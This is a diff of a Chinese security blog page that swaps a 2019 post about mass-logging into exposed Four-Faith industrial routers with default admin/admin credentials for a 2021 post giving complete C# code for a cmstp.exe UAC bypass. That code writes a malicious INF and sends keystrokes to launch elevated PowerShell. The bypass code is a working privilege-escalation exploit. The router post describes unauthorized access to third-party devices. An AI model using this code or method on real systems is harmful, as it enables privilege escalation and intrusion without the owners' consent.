@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>针对某工业级路由器进行批量 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="针对某工业级路由器进行批量 | 九世的博客">
+  <title>cmstp bypassuac研究 | 九世的博客</title>
+  <meta name="keywords" content=" 红队 ">
+  <meta name="description" content="cmstp bypassuac研究 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1649,9 +1649,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-针对某工业级路由器进行批量" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-cmstp-bypassuac研究" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">针对某工业级路由器进行批量</h1>
+        <h1 class="article-title">cmstp bypassuac研究</h1>
     
     <div class="article-meta">
         
@@ -1660,14 +1660,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">红队</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-05-25 17:11:43">2019-05-25 14:43</time>
+        创建时间:<time class="date" title="更新时间: 2021-03-04 21:06:33">2021-03-04 20:58</time>
         
     </div>
     <div class="article-meta">
@@ -1689,7 +1689,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#目录"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#操作"><span class="toc-text">操作</span></a></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -1704,61 +1704,102 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
-<li>前言</li>
-<li>操作</li>
-<li>结果</li>
-</ul>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天上Freebuf看文章的时候，无意间看到篇<br><img src="https://s2.ax1x.com/2019/05/25/Vk6dAI.md.png" alt=""></p>
-<p>看完之后，发现有张图片引起了我的注意<br><img src="https://s2.ax1x.com/2019/05/25/Vk6TvF.md.png" alt=""></p>
-<p>百度了一下：”工业4G路由器大全“发现了图片的来源<br><img src="https://s2.ax1x.com/2019/05/25/VkcKKg.md.png" alt=""></p>
-<p>居然发现了，那肯定得搞搞…</p>
-<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>看了一下这个公司名，叫“四信”<br><img src="https://s2.ax1x.com/2019/05/25/VkcwqJ.png" alt=""></p>
-<p>打开zoomye搜索了一波“Four-Faith”<br><img src="https://s2.ax1x.com/2019/05/25/VkcfqH.md.png" alt=""></p>
-<p>访问看了一下<br><img src="https://s2.ax1x.com/2019/05/25/VkgAL4.md.png" alt=""></p>
-<p>构造搜索语法：“app:”Four-Faith” +country:”CN” +port:8088 ver:”v2.0.0” +app:”Four-Faith router httpd””<br><img src="https://s2.ax1x.com/2019/05/25/Vkg3Oe.md.png" alt=""></p>
-<p>账号/密码：admin/admin，脚本批量走起！<br><img src="https://s2.ax1x.com/2019/05/25/VkWiSP.png" alt="VkWiSP.png"></p>
-<p>登录之后可以直接管理<br><img src="https://s2.ax1x.com/2019/05/25/Vk2Vc8.md.png" alt=""></p>
-<p>然后在某台路由器上发现个黑产分子<br><img src="https://s2.ax1x.com/2019/05/25/VkWRfI.md.png" alt=""></p>
-<p>微步查了一下<br><img src="https://s2.ax1x.com/2019/05/25/VkW5X8.md.png" alt=""></p>
-<p>还有个文件，下载用notepad++打开看了一下<br><img src="https://s2.ax1x.com/2019/05/25/VkWvcV.md.png" alt=""></p>
-<p>在上传微步看了一下<br><img src="https://s2.ax1x.com/2019/05/25/Vkf974.md.png" alt=""></p>
-<p>hash值：</p>
-<pre><code>样本名称
-92363b85bf7879b88f961bd2b1af16daf44c7e8a8fd57e11dc381480dfd526da
-样本类型
-ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, stripped
-样本大小
-454640
-MD5
-b3b454a35d817890cd2aec73d7c659f9
-SHA1
-d7d70c4d1c25ae24d0d5962ea791f38a2afe41f6
-SHA256
-92363b85bf7879b88f961bd2b1af16daf44c7e8a8fd57e11dc381480dfd526da
-SSDeep
-12288:RajQZk3KMqSurunllNRw5q+V4kRNJrVgsaPrd:ocBMpzNRwseJr2Dd
-</code></pre><p>IP反查了一下<br><img src="https://s2.ax1x.com/2019/05/25/VkhaM6.md.png" alt=""></p>
-<p>whois了一下<br><img src="https://s2.ax1x.com/2019/05/25/VkhXLT.md.png" alt=""></p>
-<p>有几个站死了，还有几个活着的<br><img src="https://s2.ax1x.com/2019/05/25/VkhDde.md.png" alt=""></p>
-<p>发现在新网注册的域名<br><img src="https://s2.ax1x.com/2019/05/25/Vk4CWR.md.png" alt=""></p>
-<p>云悉查了一下<br><img src="https://s2.ax1x.com/2019/05/25/Vk4X9A.png" alt=""></p>
-<p>咦，还有公司，叫：”响水九一网络科技有限公司“，这东西怕不是空壳公司吧</p>
-<p>天眼查查了一下，现在改名叫：“江苏汉世汇创网络科技有限公司”<br><img src="https://s2.ax1x.com/2019/05/25/Vk5PAg.png" alt=""></p>
-<p>大致看了一下，应该不是空壳公司<br><img src="https://s2.ax1x.com/2019/05/25/Vk5Zj0.png" alt=""></p>
-<p>官方网站也有个8ihome.com 跳到了刚刚yt那个站<br><img src="https://s2.ax1x.com/2019/05/25/Vk52b8.png" alt="Vk52b8.png"></p>
-<p>应该是劫持了，发现不能直接IP访问<br><img src="https://s2.ax1x.com/2019/05/25/VkINzn.md.png" alt=""></p>
-<p>nmap扫描了一波，只有80…..<br><img src="https://s2.ax1x.com/2019/05/25/Vk7cWQ.md.png" alt=""></p>
-<p>整理得到的信息：</p>
-<pre><code>没有CDN
-端口80开放
-系统是Windows
-php7.x写的
-中间件是IIS
-web框架用的是Microsoft ASP.NET
-</code></pre><p>爆破个路径，爆出来的目录都是一片白，玩尼玛的头皮屑<br><img src="https://s2.ax1x.com/2019/05/25/VkLyBn.png" alt=""></p>
-<p>这个东西估计是搞不下了，下次在搞，吃饭去了。。。</p>
-<p>转载请声明：转自422926799.github.io</p>
+        <p>参考链接:<br><a href="https://www.anquanke.com/post/id/86685" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86685</a><br><a href="https://mp.weixin.qq.com/s/dhh73wWhbo_dfYN-oBDW6g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dhh73wWhbo_dfYN-oBDW6g</a></p>
+<p>对应的powershell脚本:</p>
+<p><a href="https://gist.github.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1#file-uacbypasscmstp-ps1" target="_blank" rel="noopener">https://gist.github.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1#file-uacbypasscmstp-ps1</a></p>
+<p>测试系统：</p>
+<pre><code>* windows 10
+* windows 7
+* windows server 2012
+* windows server 2008
+</code></pre><p>C#改造</p>
+<pre><code class="C#">using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+using System.IO;
+using System.Threading.Tasks;
+namespace cmstp_bypassuac
+{
+    class Program
+    {
+        [DllImport(&quot;user32.dll&quot;, SetLastError = true)]
+        public static extern bool SetForegroundWindow(IntPtr hWnd);
+        public static string createinf() {
+            string filename = &quot;test.inf&quot;;
+            string command = @&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;;
+            string data = @&quot;[version]
+Signature=$chicago$
+AdvancedINF=2.5
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+[RunPreSetupCommandsSection]
+; Commands Here will be run Before Setup Begins to install
+{0}
+taskkill /IM cmstp.exe /F
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+[AllUSer_LDIDSection]
+&quot;&quot;HKLM&quot;&quot;, &quot;&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE&quot;&quot;,  &quot;&quot;ProfileInstallPath&quot;&quot;, &quot;&quot; % UnexpectedError % &quot;&quot;, &quot;&quot;&quot;&quot;
+    [Strings]
+ServiceName = &quot;&quot;CorpVPN&quot;&quot;
+ShortSvcName = &quot;&quot;CorpVPN&quot;;
+            data = string.Format(data, command);
+            File.WriteAllText(filename, data);
+            if (File.Exists(filename))
+            {
+                Console.WriteLine(&quot;Create Inf File is ok&quot;);
+                var currentpath = System.IO.Directory.GetCurrentDirectory() +  &quot;\\&quot;+filename;
+                return currentpath;
+            }
+            else {
+                Console.WriteLine(&quot;Create Inf File Failure...&quot;);
+                return &quot;&quot;;
+            }
+
+        }
+        public static IntPtr execute() {
+            Process[] cmstpdata = Process.GetProcessesByName(&quot;cmstp&quot;); //获取CMSTP线程
+            if (cmstpdata.Length != 0)
+            {
+                cmstpdata[0].Refresh();
+                var windowhandle = cmstpdata[0].MainWindowHandle;
+                return windowhandle;
+            }
+            else
+            {
+                Console.WriteLine(&quot;Not Found cmstp handle,exit....&quot;);
+                return IntPtr.Zero;
+            }
+        }
+        static void Main(string[] args)
+        {
+            string infpath=createinf();
+            if (infpath.Length != 0)
+            {
+                ProcessStartInfo runcmd =new  ProcessStartInfo(&quot;C:\\Windows\\System32\\cmstp.exe&quot;);
+                runcmd.Arguments = &quot;/au \&quot;&quot;+infpath+&quot;\&quot;&quot;;
+                runcmd.UseShellExecute = false;
+                Process.Start(runcmd);
+                IntPtr windowhandle = execute();
+                //由于刚刚cmstp进程刚刚创建无法快速获取对应的窗口句柄，使用循环来解决
+                while (windowhandle == IntPtr.Zero) {
+                    windowhandle = execute();
+                }
+                Console.WriteLine(&quot;The Cmstp Handle:&quot; + windowhandle);
+                SetForegroundWindow(windowhandle); //将CMSTP窗口调出到前台并激活该窗口
+                SendKeys.SendWait(&quot;{ENTER}&quot;);    
+            }
+        }   
+    }
+}
+</code></pre>
+<p>效果如下<br><img src="https://s3.ax1x.com/2021/03/04/6Zt5kj.gif" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1768,12 +1809,12 @@ web框架用的是Microsoft ASP.NET
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>针对某工业级路由器进行批量</p>
+    <p><span class="copy-title">文章标题:</span>cmstp bypassuac研究</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-05-25, 14:43:24</p>
-    <p><span class="copy-title">最后更新:</span>2019-05-25, 17:11:43</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/8cc9d20f.html" title="针对某工业级路由器进行批量">http://422926799.github.io/posts/8cc9d20f.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-03-04, 20:58:58</p>
+    <p><span class="copy-title">最后更新:</span>2021-03-04, 21:06:33</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/d38c8377.html" title="cmstp bypassuac研究">http://422926799.github.io/posts/d38c8377.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
